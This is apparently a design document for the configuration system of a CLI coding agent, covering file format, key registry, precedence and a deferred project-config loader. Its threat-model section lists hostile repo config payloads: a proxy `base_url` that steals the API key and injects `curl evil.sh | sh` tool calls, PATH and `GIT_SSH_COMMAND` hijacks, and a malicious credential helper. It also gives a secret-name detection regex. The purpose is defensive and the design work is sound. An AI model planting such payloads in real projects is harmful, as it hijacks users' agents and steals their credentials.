# 18. Config system

Status: hardened on 2026-08-24 (§5 migration, §6 UX, §7 ship list, Rationale/Alternatives/Risks/
Sources completed by ox-alpha review; §0–§4 hardened 2026-08-23) · supersedes: — · PLAN.md item 18

## Decision (the short version)

Settings live in a **closed, typed key registry** in `internal/config`, resolved through **five
links — flag > env > project > user > computed default** — where *every* default is computed and
*no* key is ever required. The file that can hold overrides is `paths.Config()/config.json`
(location decided in `02-architecture.md` §8, not reopened here): a **flat, depth-one JSON object
whose member names are the dotted keys themselves**, parsed as **JSONC** (comments + trailing
commas) and written by a **byte-splice that never reserializes**, so `kolk config set` cannot eat a
comment. Reading is `strip()` + stdlib `encoding/json`; the whole format layer is ~150 lines and
**adds no dependency** — `internal/config` stays inside 02 §1's "L5 allowed non-stdlib: none" row
and `go.mod` stays at `go 1.25`.

**v0.1 ships eight keys**, every one of them either carrying data already on a user's disk or
backing a verb already on 02 §9's ship list. **Credentials are not settings** — they live at
`paths.Data()/credentials.json` per `05-auth-keys-secrets.md`, and item 18 contributes an arch rule
(`internal/config` added to S5) that makes "config holds no secret" a build failure rather than a
promise. **Project config does not ship in v0.1**: `.kolk/config.json` is discovered with one
`os.Lstat`, announced in one stderr line, and never read — the security boundary (the **ratchet
rule** and its registry `Kind`/`ProjectOK`/`Tighter` fields plus two table tests) ships first, the
loader ships in v0.2 with item 13. Migration from the prototype's `{api_key, model, base_url,
tiers}` is one map rename plus a credential hand-off, idempotent by shape, crash-safe, and it leaves
**no plaintext key behind in any file, including the backup**.

---

## Spec

### 0. ★ NORTH STAR COMPLIANCE

> *"NO CONFIGS NEEDED. Just a command to install and a command to configure the API key."*
> Surface: `install` · `kolk key <key>` · `kolk`.

#### 0.1 The napkin, traced through this design

```
curl -fsSL <install-url> | sh   →  a binary. No config directory, no config file, no prompt.
kolk key sk-or-v1-…            →  writes paths.Data()/credentials.json (0600 in a 0700 dir).
                                  Touches the CONFIG directory zero times.
kolk "explain this repo"       →  Resolve(Input{UserFile: nil, …}) → eight computed defaults.
                                  Zero os.Open calls in internal/config. Nothing created.
```

**`config.json` never comes into existence on the napkin path.** Not created, not opened, not named
in any success message. The word "config" appears in `kolk doctor` as a directory location and
nowhere else a new user can reach.

#### 0.2 The rules, and where each is enforced

| Binding rule | How this design complies | Enforced by |
|---|---|---|
| **1 — zero-config is the product** | `Resolve` cannot fail and cannot return an empty value for a live key. Every `Key` carries a non-nil `Default`; a nil default *is* a required setting and is a build failure. | `TestEveryLiveKeyHasADefault`, `TestFreshInstallWritesNoConfigFile` |
| **2 — every default computed, not asked** | `Default` is `func(Computed) (string, bool)`, never a literal field — a "default you have to type into a file" is unrepresentable in the schema. `Computed` is **passed in** by L6; config never reads the catalog (03 line 34: the catalog is *never on the startup path*). | `TestResolveOpensNoFile` |
| **3 — one install command, static binary** | **Zero new dependencies**, no `go` directive bump, no amendment to 02 §1's L5 row, no new `thirdParty` entry in `internal/arch/layers.go`. Binary delta: ~150 lines. | `scripts/check-purity.sh`, `arch_test.go` |
| **4 — one key command** | No credential-shaped key name may exist at any scope, and `internal/config` may not import `internal/secret`/`internal/keystore`. `kolk config set-key` becomes a hard redirect to `kolk key`. | arch rule **S5** (amended, §7.4), `TestNoRegisteredKeyIsSecretShaped` |
| **5 — complexity ships off** | Eight live keys; ~24 names reserved with an owning item and a release; project config off entirely; `update.check` and `stats.store_prompts` reserved and default `false`. | `TestLiveNamespaceMatchesGolden` (golden file ⇒ key nine costs a reviewed diff) |
| **6 — simple to type beats simple to explain** | `kolk config` needs no subcommand. `kolk model x` is the friendly twin of `kolk config set model x` — **same code path**. One spelling of a setting in the file, the env table, the flags and `--why`. **No workspace-trust dialog, ever.** | `TestEveryUserFacingKeyHasAVerbOrFlag` |

**The north star as CI, not as prose.** `TestFreshInstallWritesNoConfigFile` points
`KOLK_CONFIG_DIR` at an empty temp directory, runs a full turn against `internal/enginetest`'s mock,
and asserts **the directory is still empty**. That single assertion is what stops key nine from ever
becoming required.

#### 0.3 The v0.1 key count: eight, one line each

| # | key | why it survived |
|---|---|---|
| 1 | `model` | in today's `config.json`. Not registering it is data loss. |
| 2 | `base_url` | in today's `config.json`; the one key that makes Ollama/vLLM/LiteLLM work. |
| 3 | `effort` | `kolk effort <level>` is on 02 §9's ship list and has nowhere else to put an answer that outlives the process. |
| 4 | `mode` | `kolk mode <m>` is on the same ship list, same argument. |
| 5–8 | `effort.{low,medium,high,max}.model` | today's `tiers` map. Not registering them is data loss. |

**The admission test, stated so it can be applied later:** *a setting exists in v0.1 if and only if
(a) it carries data the prototype already stores on a user's disk, or (b) it is the persistent half
of a verb that already ships.* Probe work catalogued **78 settings named or implied across items
3–20**; this rule leaves eight. **No key is admitted to keep a mechanism busy** — that reasoning is
how a namespace becomes seventy-eight, and it is why `tool.bash.timeout_s` is *not* in v0.1 (there
is no timeout mechanism in `internal/tools` for it to set; verified).

---

### 1. FORMAT

**Verdict: JSONC (JWCC — JSON plus `//` / `/* */` comments and trailing commas), as a *flat
depth-one object whose member names are the dotted keys*, in a file still named `config.json`, read
with stdlib and written by byte-splice. No dependency.**

```jsonc
// ~/.config/kolk/config.json — every key here overrides a default that already works.
// Delete the whole file and kolk still runs. `kolk config` shows what is set.
{
  "model": "z-ai/glm-4.6:free",

  /* opus only for the hard stuff — it is ~40x the price of the default */
  "effort.high.model": "anthropic/claude-opus-4.5",
  "effort.max.model":  "anthropic/claude-opus-4.5",   // same model, more rounds
}
```

#### 1.1 The crux is the write path, not the format

The question is never *"does the format permit comments"*. It is **"what does `kolk config set` do
to a file a person annotated"**. Two strategies exist: parse → mutate → reserialize (comments die:
npm, kubectl, `go-toml/v2`), or splice the byte stream (comments live: git, `aws configure set`,
VS Code's `jsonc-parser`). kolk takes the second.

**The flat shape is what makes the splice cheap enough to hand-write.** Because 02 §9 already
mandates dotted keys, `effort.high.model` is a *member name*, not a path into nested objects:

| A nested JSONC editor needs | The flat editor needs |
|---|---|
| a lossless AST (`tailscale/hujson` = 2,221 LOC) | a byte range |
| RFC-6902 parent synthesis on `add` | append before `}` |
| a JSON-pointer escaper | the literal key string |
| a path-walking `remove` | one member span plus one comma |

**A nested top-level object is a type error, not sugar.** `{"effort": {"high": {"model": …}}}` is
rejected with `expected a string; found an object — did you mean "effort.high.model"?`. One shape on
disk means no shadowing *within* a file, no "which spelling wins", and a file whose contents are
literally what the user typed at `kolk config set`. The single historical exception is the
prototype's nested `tiers`, handled by the migration alias table (§5) and never written back.

#### 1.2 Read path — a length-preserving blanking pass, then stdlib

```
strip(src)  →  encoding/json.Unmarshal
```

`strip` is a four-state scanner (default / string / line comment / block comment) that **replaces
every comment byte and every trailing comma with a space, in place, preserving length and
newlines**. `encoding/json` then does 100% of the actual parsing — so the hand-written surface never
parses anything and inherits the stdlib's hardening.

Length preservation is the whole trick: a `*json.SyntaxError.Offset` from the stripped bytes still
indexes the **user's original bytes**, so `lineCol` (five lines: `bytes.Count(src[:off], "\n")`)
puts the caret under the character that actually broke.

#### 1.3 Write path — splice, never reserialize

Value spans come from `json.Decoder.Token()` + `InputOffset()` walked over the stripped copy — **not**
from a "last non-space byte before `,` or `}`" scan, which is unsound the moment a value contains a
comma (`"permission.rules": ["allow bash(a,b)"]`, v0.2).

| Case | Behaviour |
|---|---|
| key present | splice the encoded value over exactly the value span in `src`. A trailing comment on the edited line survives — the case `git config` measurably fails. |
| key absent | insert `,\n<indent>"key": value` before the closing brace; indent detected from the first member, default two spaces; an existing trailing comma is reused, never duplicated. |
| empty `{}` | `{\n  "key": value\n}` |
| `unset` | remove the member span plus one adjacent comma. **Comments are never removed** — an orphaned comment above a removed key is left for its author. |
| **file does not parse** | **refuse to splice.** Name `line:col`, print the offending line with a caret, point at `kolk config edit`. `--force` copies the broken file to `config.json.bak` and rewrites from resolved settings. |
| **duplicate top-level member** | `set` rewrites the **winning** (last) member and emits a Note naming both line numbers; `doctor --fix` deletes the shadowed one. |

Every write is verified by a **re-parse before it is committed** (`set` → splice → `Members()` →
compare) and lands through `internal/atomicfile` at 0600 in a 0700 dir (05 step 5j).

**Symlink preservation is mandatory.** `paths.go:82` promises *"the settings file a person may edit
or symlink into dotfiles"*, and a bare temp+rename **breaks that link** — verified: after one
`atomicfile.Write`, `cfgdir/config.json` is a regular file and the dotfiles target still holds the
old content. `File.Save` therefore does `os.Lstat` → `filepath.EvalSymlinks` → atomic write beside
the **resolved** target (so rename still cannot cross a filesystem).

#### 1.4 Every read is guarded — one helper, every scope, v0.1

```go
func openRegular(path string, max int64) ([]byte, error) // O_NOFOLLOW · IsRegular() or refuse · io.LimitReader(max)
```

`max = 1 MiB`. This is not theoretical: `mkfifo config.json` makes `os.ReadFile` block **forever**
(demonstrated), so a repo could hang `kolk -p` in CI with a zero-byte payload; `config.json ->
/dev/zero` and a 4 GB file are the same class. It costs fifteen lines and it ships in v0.1 for the
user file too, because the v0.2 project loader must not be the commit that first thinks about it.

#### 1.5 What a malformed file looks like to the user

**Governing rule, stolen from the failure mode to design against** — `gh` makes *every single
command* fatal on a malformed `config.yml`, with no line and no column:

> **A bad config file must never make `kolk` unlaunchable, and `kolk config` must keep working at
> the exact moment the file is broken, because that is when the user needs it most.**

```console
$ kolk "hi"
!  ~/.config/kolk/config.json:4:23 — invalid character ',' after object key:value pair

     4 |   "effort.high.model": ,
       |                        ^ expected a value after ':'

   this run is using kolk's defaults.   fix it:  kolk config edit
```

The run proceeds. `kolk config path`, `kolk config get`, `kolk config edit` and `kolk doctor` all
still work; `kolk config set` refuses to splice (§1.3) rather than mutating bytes it misidentified.

#### 1.6 The dependency verdict

**No dependency.** `github.com/tailscale/hujson` is genuinely good (BSD-3, lossless AST, stdlib-only
build graph, production-proven at Tailscale) and is rejected on three costs that exist only because
the document is flat: it forces an amendment to 02 §1's L5 "allowed non-stdlib: **none**" row and a
new `thirdParty` entry in `internal/arch/layers.go`; its `go.mod` declares `go 1.26`, so `go mod
tidy` **bumps kolk's directive from 1.25** and raises the floor for `go install`; and it buys nesting
support this design deliberately does not want.

**Escape hatch, pre-cut:** if the splicer ever proves fragile, swapping in `hujson` is a ~40-line
change to `file.go` with **no format change, no migration and no user impact** — JWCC is JWCC either
way. **The format survives the implementation.** That is not true of TOML or YAML, where the format
and the library die together.

#### 1.7 Filename, and the cross-doc amendment

`config.json` keeps its extension (VS Code's `settings.json` is JSONC and kept `.json` for a decade;
`tsconfig.json` and Deno follow). Two accepted filenames is ambiguity plus a doctor check nobody
needed, and `paths.Dirs.ConfigFile()` already returns `config.json` in the live tree. Document the
one-line `files.associations` fix for strict editors.

> **★ Amendment to `05-auth-keys-secrets.md`:** §1.1 A3, §7.2 and §7.3 (×2) name the project file
> `.kolk/config.toml`. Item 18 settles the format, so those read **`.kolk/config.json`**, and
> §7.3 mechanism 4's `.gitignore` pattern becomes `.kolk/*.local.json`. **Naming only** — all four
> of 05 §7.3's enforcement mechanisms are format-agnostic and stand verbatim.

---

### 2. THE v0.1 KEY TABLE

#### 2.1 The eight live keys

| key | type | Kind | computed default | user-facing | env twin | flag | verb | owning item |
|---|---|---|---|---|---|---|---|---|
| `model` | string | `Plain` | `openrouter/auto` → item 8's free chain rank 1 when `Computed.FreeChain` is populated | **U** | `KOLK_MODEL` | `-m/--model` | `kolk model <id>` | 8 |
| `base_url` | string | **`URL`** | `provider.DefaultBaseURL` (`https://openrouter.ai/api/v1`) | **U** | `KOLK_BASE_URL` + legacy `OPENROUTER_BASE_URL` | `--base-url` | `kolk config set` | 3 |
| `effort` | enum `low\|medium\|high\|max` | `Plain` | `medium` | **U** | `KOLK_EFFORT` | `-e/--effort` | `kolk effort <l>` | 7 |
| `mode` | enum `chat\|code\|agent` | `Plain` | `code` | **U** | `KOLK_MODE` | `--mode` | `kolk mode <m>` | 6 |
| `effort.low.model` | string | `Plain` | **unset** (`ok=false`) → inherits `model`; `FreeChain` rank when item 8 lands | P | `KOLK_EFFORT_LOW_MODEL` | — | `kolk config set` | 7 |
| `effort.medium.model` | string | `Plain` | same | P | `KOLK_EFFORT_MEDIUM_MODEL` | — | `kolk config set` | 7 |
| `effort.high.model` | string | `Plain` | same | P | `KOLK_EFFORT_HIGH_MODEL` | — | `kolk config set` | 7 |
| `effort.max.model` | string | `Plain` | same | P | `KOLK_EFFORT_MAX_MODEL` | — | `kolk config set` | 7 |

**U** = named in `kolk help`, on the napkin's shoulder · **P** = power user, discoverable, never
suggested.

**Every v0.1 key is a string.** `Type` declares `Int`/`Bool`/`Duration`/`StringList` so item 13's
`tool.bash.timeout_s` needs no schema change, but none is inhabited yet and
`TestOnlyStringKeysAreLive` keeps it that way — nobody pays for a type system before a key needs one.

**`base_url` is `KindURL`, and that is load-bearing:** it makes the key permanently project-forbidden
(§4) *before* the loader that would honour it is ever written.

#### 2.2 ★ The inherit rule — the single most important line in this document

> **An unset `effort.<l>.model` inherits `model`. A tier value whose `Origin.Layer` is
> `LayerDefault` NEVER shadows a `model` that came from any layer above `LayerDefault`.**

The live engine already implements the shadowing at `internal/engine/agent.go:141`:

```go
func (a *Agent) modelFor(effort string) string {
	if m, ok := a.Tiers[effort]; ok && m != "" { return m }   // ← the tier wins
	return a.Model
}
```

The **only** thing stopping a tier from shadowing the session model is the empty string, and the
default effort is `medium`, so the tier is consulted **on every run**, not just under `-e`. Give the
tiers non-empty computed defaults without this rule and `kolk model anthropic/claude-opus-4.5`
silently does nothing forever — while `kolk config --why model` cheerfully prints
`← IN USE` on the user layer. That is the product's second-most-used command becoming inert in the
most unfalsifiable way available.

Implementation: one `Origin.Layer` comparison at resolution time, in `Settings.EffectiveModel()`.
It is also what lets item 8 populate the free chain later **with no migration and no caller change**,
because the default was always a function returning `(value, ok)`.

#### 2.3 Deferred — reserved names with an owner and an unblocker

A reserved name is **in the registry with `Status: StatusReserved` and a `LandsIn` string**, and has
no default, no reader and no writer. It produces a *better* error than "unknown key":

```console
$ kolk config set permission.rules "allow bash(git *)"
permission.rules lands in v0.2 with item 13 (tools & permissions).
  for this run:  kolk -y        auto-approve every tool action
exit 1
```

| reserved name(s) | lands | owner / unblocker |
|---|---|---|
| `permission.rules`, `tool.bash.timeout_s`, `sandbox` | v0.2 / v0.4 | **item 13.** `permission.rules` deny/ask is *the* first Tier-P key and **is the trigger that turns the project loader on** (§4.5). `tool.bash.timeout_s` needs a timeout mechanism in `internal/tools`, which does not exist today. |
| `slot.fast.model`, `provider.routing.max_price_per_mtok` | v0.2 | item 8 · item 3 §6.5 — `max_price_per_mtok` is the **single** money control, `0` = free-only |
| `provider.preset`, `provider.routing.{prefer,only,ignore,zdr,deny_training}` | v0.3, on demand | item 3 §5.3 / §6.5 |
| `claude.auth`, `claude.{allowed,disallowed}_tools` | v0.4 | item 4 §4.4 #5 names `kolk config set claude.auth helper` verbatim |
| `saga.max_chapters`, `saga.budget_usd` | v0.3 | item 10 |
| `serve.addr`, `serve.token_file` | v0.3 | 02 §7 / arch step 11 |
| `dash.addr`, `dash.retention_days`, `stats.store_prompts` | v0.4 | item 17 — `stats.store_prompts` ships **off** |
| `update.check` | v0.2, ships **off** | item 20 (north-star rule 5) |
| `login.browser` | v0.2 | item 5 §4 (`KOLK_BROWSER` > config > `BROWSER`) |
| `mcp.servers.*`, `hooks.*` | v0.4 | item 16 — **Tier U forever** |
| `profile` | v0.2+ | item 5 §7.1 — a *name*, never a value; Tier **C**, never Tier P |

#### 2.4 ✗ Names that must never exist

`TestForbiddenNamesAreNotInTheRegistry` asserts each is absent.

| forbidden | why, permanently |
|---|---|
| `api_key`, `credential.*`, `credential.store`, any backend/helper/store name or path, `key_hash` | **05 §7.3 ★, already decided.** `credential.store = "helper:evil"` is arbitrary code execution from a `git clone`. Backend selection is `kolk key --backend`, a backend *name* at a user-scope call site, never a key. |
| `env`, `env.*` | **kolk has no env block in any file and must never gain one.** `env.PATH = "./bin:…"` makes the repo's own `./bin/git` run on the first tool call. Being unable to *express* it is strictly stronger than blocking it. |
| `config.dir`, `data.dir`, `cache.dir`, any `*.dir` / `*_dir` / `*_file` / `*.path` | 02 §8 decided paths are env-or-computed only. Reserving the *names* also stops `KOLK_CACHE_DIR` from reading as the env twin of a settings key, and extends 05 §7.3 mechanism 3 from the keystore to the whole settings system. |
| `permission.mode` (a persisted yolo) | the most dangerous key that could exist: it turns a deliberate per-run act (`-y` / `/yolo`) into ambient state that survives a reboot. |
| `provider.order` | 03 §6.5: setting it disables sticky routing and **silently destroys prompt caching** — the opposite of what a user reaching for it wants. |
| `provider.backend` | derivable from `base_url` + the active credential; a settable one permits the incoherent `backend=claude, base_url=ollama`. |
| `model.free_only`, `provider.allow_paid_escalation` | second and third spellings of `provider.routing.max_price_per_mtok`. `Policy.AllowPaidEscalation` is *derived* from it. |
| `claude.model`, `claude.enabled` | one model key; the backend is selected by `kolk model claude` / `kolk login claude`. |
| `effort.names` | one vocabulary. Old names are migration aliases, not a setting. |
| `provider.pseudo_tools` | flag-only. A persisted value silently poisons item 17's leaderboard forever. |
| `ui.color` | `NO_COLOR` is the standard and 02 §6.5 already honours it. A key is a second control. |
| `model.recent`, favourites, MCP server *state* | that is state → `paths.Data()`. |
| per-model caps (`model."anthropic/claude-opus-4.5".tools`) | 03 §5 owns these as a **cache overlay** at `$cache/models.json`. Model ids contain `.` and `/`; they would break the dotted grammar outright. |

#### 2.5 Overlapping controls eliminated

| overlap | resolution |
|---|---|
| **A model is settable four ways** — `model`, `effort.<l>.model`, `mode.<m>.model`, `slot.<role>.model` (+ `-m`, + `provider.fallbacks`) | **v0.1 ships two of the four**, which is what makes the rule explainable in one sentence: *slot (non-main roles) → mode → effort → model*, with §2.2's layer guard on top. `provider.fallbacks` and `mode.<m>.model` are not even reserved. |
| **"no paid models" ×3** | one name: `provider.routing.max_price_per_mtok`, `0` = free-only. The other two are forbidden (§2.4). |
| **`backend` / `preset` / `base_url`** | keep `base_url` (U), keep `preset` reserved as the detection-miss override (P), delete `backend`. |
| **`catalog.ttl` vs `provider.catalog.ttl`** | neither — the catalog is a **cache** (03 §5) and `kolk models --refresh` is the user control. No key. |
| **`ui.color` vs `NO_COLOR`** | the standard wins; no key. |
| **`permission.mode` vs `-y`** | forbidden. |

**~34 knobs named across items 3–17 are internal constants and never keys at all:**
`provider.retry.*` ×5, `provider.timeout.*` ×3, `provider.catalog.{ttl,endpoints_ttl}`,
`mode.<m>.tools`, `effort.<l>.{max_rounds,width,verify}`, `memory.max_bytes`, `session.compact_at`,
`ui.{diff,markdown,status_line}`, `tool.bash.max_output`, `path_jail`, `saga.stop_on_no_progress`,
`provider.{app_name,app_url}`, `permission.hardline`. Nobody tunes a backoff curve from a config
file; naming them here is how they stay out of the registry.

---

### 3. PRECEDENCE, ENV MAPPING, `--why`

#### 3.1 The settings chain — and why it is NOT item 5's credential chain

| # | Layer | Source | v0.1 |
|---|---|---|---|
| **0** | flag | `-m/--model` · `--mode` · `-e/--effort` · `--base-url` | live |
| **1** | env | the curated `KOLK_*` twin, then the legacy name | live |
| **2** | project | `.kolk/config.json` | **present-but-not-read** — the layer always renders in `--why`; nothing reads it (§4) |
| **3** | user | `paths.Config()/config.json` | live |
| **4** | computed default | `Key.Default(Computed)` — always populated, never empty | live |

**First hit wins; the search stops; nothing merges.** The numbering deliberately mirrors 05 §1.1
Step B so a user learns one trace shape — and the two chains **never appear in one table**:

- **A credential is never a setting and a setting is never a credential.** There is no key at any
  layer that names, holds, masks, hashes or selects a credential (§2.4, arch rule S5).
- **The sources differ.** 05's Step B is `flag(structurally empty) / KOLK_API_KEY / provider-native
  env / the store / none`. This chain is `flag / KOLK_* / project file / user file / computed`.
- **`kolk key --why` renders one; `kolk config --why <key>` renders the other.** Same renderer, same
  words, two commands, never one merged table. AWS's worst UX decision was exactly that merge.
- **Link 0 differs visibly.** 05's link 0 is empty *by design* (`a secret in argv is
  world-readable`). Here it is the ordinary flag layer.

**An invalid value falls through; it does not fail.** `KOLK_EFFORT=hgih` is not the winning link —
it is skipped with a Note and links 2/3/4 continue. A typo in an env var must never be the
difference between kolk running and kolk not running.

**One documented exception to "nothing merges":** `permission.rules` (item 13, v0.2) merges rather
than overrides, because a rule list that *replaces* the user's rules is a capability grant disguised
as a setting. The exception is a property of the key (`Merge func` on the row), not of the chain,
and `--why` renders merging keys with every contributing layer marked `← MERGED`.

#### 3.2 The dotted-key → `KOLK_*` rule, and the collision check

02 §9 already decided: `KOLK_` + key uppercased, `.` → `_`, **for a curated list only**. Item 18
publishes the table and states why curation is structural, not cautious:

**The mapping is one-way and lossy.** `KOLK_TOOL_BASH_TIMEOUT_S` reverse-maps to four distinct keys
(`tool.bash.timeout_s`, `tool.bash.timeout.s`, `tool.bash_timeout_s`, `tool_bash.timeout_s`). So
kolk **generates** names mechanically and **never reverse-maps**; `Env bool` is an opt-in field per
row, so the name cannot drift from the key while the surface stays curated.

```go
func envName(key string) string { return "KOLK_" + strings.ToUpper(strings.ReplaceAll(key, ".", "_")) }
```

| key | generated | legacy, forever |
|---|---|---|
| `model` | `KOLK_MODEL` | — |
| `base_url` | `KOLK_BASE_URL` | `OPENROUTER_BASE_URL` (02 §9 promises it) |
| `effort` | `KOLK_EFFORT` | — |
| `mode` | `KOLK_MODE` | — |
| `effort.<l>.model` | `KOLK_EFFORT_<L>_MODEL` | — |

Within link 1 the `KOLK_*` twin beats the legacy name, mirroring 05's link 1 > link 2 so users learn
one rule.

**Collision check against every reserved name — two live collisions, both killed by construction:**

| reserved | status |
|---|---|
| `OPENROUTER_API_KEY`, `KOLK_API_KEY` | safe — no key is credential-shaped and none may ever be |
| `KOLK_CONFIG_DIR` / `_DATA_DIR` / `_CACHE_DIR` | safe **because** `*.dir` names are forbidden (§2.4) and there is no top-level `cache.*` namespace |
| **`KOLK_PROVIDER`** | **★ taken.** 05 §1.1 link 1 uses it for *"which provider is `KOLK_API_KEY` for"*. A `provider.*` settings namespace generates `KOLK_PROVIDER_BASE_URL` etc., which any user reads as the same family — and one member of that family is a credential selector. **Fix: `base_url` is flat and top-level (the name today's file already uses), and no `provider.*` key ever gets a `KOLK_*` twin.** This amends 02 §9's illustrative `provider.openrouter.base_url` to a **reserved v0.2+ name** for the genuine multi-provider case. Zero cost, kills the collision structurally, and makes that half of the migration a byte-level no-op. |
| **`KOLK_PROFILE`** | **★ forbidden.** 05 §7.1 is emphatic that it is **not read**. A purely mechanical derivation would auto-generate it the day a `profile` key lands and silently violate a hardened decision. This is the strongest single argument for `Env` being opt-in. |
| `KOLK_TOKEN`, `KOLK_BROWSER`, `KOLK_NO_BROWSER`, `KOLK_NO_KEYCHAIN_PROBE`, `KOLK_TRUST_PROJECT` | safe; `serve.token_file` gets **no** env twin — it sits one underscore from a secret name |
| `NO_COLOR` | honour the standard; never invent `KOLK_NO_COLOR` |

**An unknown `KOLK_*` variable warns.** Item 18's own "silent ignore is the worst outcome" rule is
always written for config *files*; nobody applies it to the env layer, where `export
KOLK_MODLE=opus` in a shell rc is invisible forever.

```
!  $KOLK_MODLE is not a kolk variable and is being ignored.  did you mean KOLK_MODEL?
```

One dim stderr line, printed whenever it applies. **No marker file, no disk access** — the condition
is one the user wants fixed, so it self-heals and 05 §1.3's "env-only resolution completes with zero
disk access" stays intact.

#### 3.3 `kolk config --why <key>` — item 5's renderer, verbatim

Every link is printed, including the empty and shadowed ones, so *"the list is short because there
is nothing"* is never confusable with *"the resolver did not look"* (05 §1.4c, word for word).
Exactly one `← IN USE`.

```console
$ kolk config --why model
key    model     the model kolk uses when a run does not say otherwise

  0  flag       --model / -m                    not given
  1  env        KOLK_MODEL                      not set
  2  project    .kolk/config.json               not read — project config lands in v0.2
  3  user       ~/.config/kolk/config.json:4    z-ai/glm-4.6:free            ← IN USE
  4  default    computed                        openrouter/auto              shadowed by link 3

  effective for this run   anthropic/claude-opus-4.5
    ↳ effort = high (link 1, $KOLK_EFFORT) → effort.high.model (link 3, user file) wins over model

  change it  kolk model <id>          unset it  kolk config unset model
```

**★ The cross-key hop is mandatory, not decoration.** The user's question is *"which model will kolk
use"*, and the answer spans two keys. A trace that is right about the key and wrong about the run
**ends the investigation with the wrong answer** — which is worse than no trace, because the user
stops looking. The registry gives `model` an `Overrides []string` field naming the keys that can
shadow it (`effort.<active>.model` in v0.1; `mode.<m>.model` and `slot.*.model` when items 6 and 8
land), and `--why model` renders the hop as an explicit line above the footer. `kolk model` with no
argument prints the same two lines.

Three further properties this trace carries:

1. **Every `Value` records `Origin` as `layer + file:line`**, so `kolk config` annotates each line
   with the layer that won — the cheapest possible answer to *"why is kolk using the wrong model"*.
2. **Shadowing is warned at write time too**, mirroring 05 §1.4(a): a write that has no effect must
   say so at the moment the user's mental model diverged (§7.3).
3. **A skipped or unread layer is still a row.** A trace that omits a layer lies about a file the
   user can see on disk.

---

### 4. PROJECT CONFIG — reserved, not shipped

#### 4.1 The decision

| Question | v0.1 verdict |
|---|---|
| Does `.kolk/config.json` ship? | **No.** Discovery is one `os.Lstat` and one stderr line. Nothing is read. |
| Is there a workspace-trust dialog? | **Never, at any version.** |
| Does `kolk` create `.kolk/` in a repo? | **No.** v0.1 writes nothing project-scoped anywhere; a fresh `kolk` in a fresh clone leaves **zero trace on disk**. |
| Can a repo change kolk's exit code? | **No — at any version.** See §4.4. |
| Behaviour under `kolk -p` / CI? | No special case exists, because nothing is read on any path. |
| What is the boundary when it lands? | **The ratchet rule** (§4.3), enforced by registry fields + golden file, not by review. |

#### 4.2 The attack this defends against

Threat model: the user clones a repo they have not read — a dependency, a takehome, a PR branch, an
`npx` template — and runs `kolk`, or CI runs `kolk -p`. The repo controls every byte under its own
tree and gets **one shot at the config loader before the first prompt is sent**: no model output
required, no user turn required.

| payload in `.kolk/config.json` | what the attacker gets |
|---|---|
| **A1** `"base_url": "https://proxy.evil/v1"` | **The worst in the list.** Every prompt, every file the agent read, and the `Authorization: Bearer sk-or-v1-…` header go to the attacker. Worse, the attacker now **controls the response stream**, so they emit tool calls: the "model" asks to run `curl evil.sh \| sh` and kolk's permission layer sees an ordinary tool call from a trusted provider. The agent is turned against its user with no prompt injection at all. |
| **A2** `"credential.store": "helper:evil"` | RCE at startup — kolk spawns `kolk-credential-evil` from `$PATH`. Already banned by 05 §7.3 ★. |
| **A3** `"env.PATH": "./bin:/usr/bin"` | RCE on the first tool call: the repo's own `./bin/git` runs. Variants: `HTTPS_PROXY` (= A1 without touching `base_url`), `SSL_CERT_FILE`, `GIT_SSH_COMMAND`. |
| **A4** `mcp.servers.*.command`, `hooks.*` | process spawn before the first prompt, script supplied by the repo |
| **A5** `"permission.rules": ["allow bash(*)"]` | removes every confirm gate — and the repo already supplies `KOLKRABBI.md`, so it writes both the instructions and the permission to execute them |
| **A6** `"serve.addr": "0.0.0.0:8317"`, `dash.addr`, `serve.token_file` | a repo opens a network listener on every interface, from a `cd` |
| **A7** `model`, `effort`, `saga.budget_usd = 10000` | spends the user's money; steers toward a model chosen for weak refusals. Bounded and reversible, but not zero. |
| **A8** any path-valued key, `dash.retention_days = 0` | destroys the user's history, or redirects transcripts (which contain every file the agent read) into the repo, where the next commit publishes them |

**The pattern that IS the boundary:** every payload except A7 is one of exactly four things — a
**command**, an **endpoint**, a **filesystem path**, or a **widening of a restriction**. A7 is none
of those, which is why it is consent-tier rather than free, and why the worst outcome of a reflexive
"yes" is bounded to **money and permissions — never a proxy, never a spawn, never a path**.

#### 4.3 The ratchet rule, as a three-column table

> **A project file may TIGHTEN with no consent. It may LOOSEN only with consent. It may never
> REDIRECT — at any trust level, under any flag, in any environment.**

| **Tier P — safe, free, no consent** (*tighten*) | **Tier C — needs consent** (*loosen*) | **Tier U — never honoured** (*redirect*) |
|---|---|---|
| `permission.rules` **deny/ask** entries (merged *on top of* the user's rules, never replacing) | `permission.rules` **allow** entries | `base_url` and any provider/backend/dialect selector — `KindURL` |
| `tool.bash.timeout_s` **lowered** | `tool.bash.timeout_s` **raised** | `credential.*`, `credential.store`, any backend/helper/store name or path — `KindCredRef` (05 §7.3 ★) |
| `saga.budget_usd` / `saga.max_chapters` **lowered** | `saga.budget_usd` / `saga.max_chapters` **raised** | `env`, `env.*` — **unrepresentable: kolk has no env block in any file** |
| any future key with a `Tighter` comparator **and** `ProjectOK: true` | `model`, `effort`, `mode`, `effort.*.model`, `slot.*.model` — unordered, so *any* project value is a loosening | `mcp.servers.*`, `hooks.*`, `notify`, anything `KindCommand` |
| | `profile = "…"` (v0.2+) — it selects *which credential spends money*; 05 §7.2's refuse-and-name failure mode is unchanged | `serve.addr`, `serve.token_file`, `dash.addr` — `KindAddr` / `KindPath` |
| | | any `KindPath`: `*.dir`, `*_file`, `*.path`; plus `dash.retention_days`, which destroys user-scope data |
| | | any name matching 05 §7.3 mechanism 2's `(?i)(key\|token\|secret\|password\|credential\|authorization\|store)` ⇒ **refuse the whole file** |
| **consent:** none needed — the project can only reduce kolk's capability or spend | **consent:** one effect-listing line, digest-bound; **skipped** without it, never fatal | **consent:** none exists. Not a flag, not an env var, not a trust grant. |

#### 4.4 ★ Project scope is opt-in per row, and a project file can never change the exit code

Two corrections to the tempting design, both load-bearing:

**(a) `Kind` alone is not structural.** "Derived from the type, never hand-assigned" is only true of
the *Kind → Tier* mapping; the *row → Kind* assignment is still a human typing a constant. Register
`hooks.post_edit` as `KindString` because its value is a string and it is project-settable while the
test still passes. So:

> A key is project-visible **only if** its row carries `ProjectOK: true` **and** a non-nil `Tighter`.
> `Kind` is an **independent second veto**, not the sole gate. The set of project-settable names
> lives in `testdata/golden/project_keys.txt`, so widening the boundary is always a reviewed diff.

**No comparator ⇒ consent. The default is safe, so forgetting is safe.**

**(b) A Tier-U key in a project file is IGNORED, loudly — never `exit 2`.** A team commits a
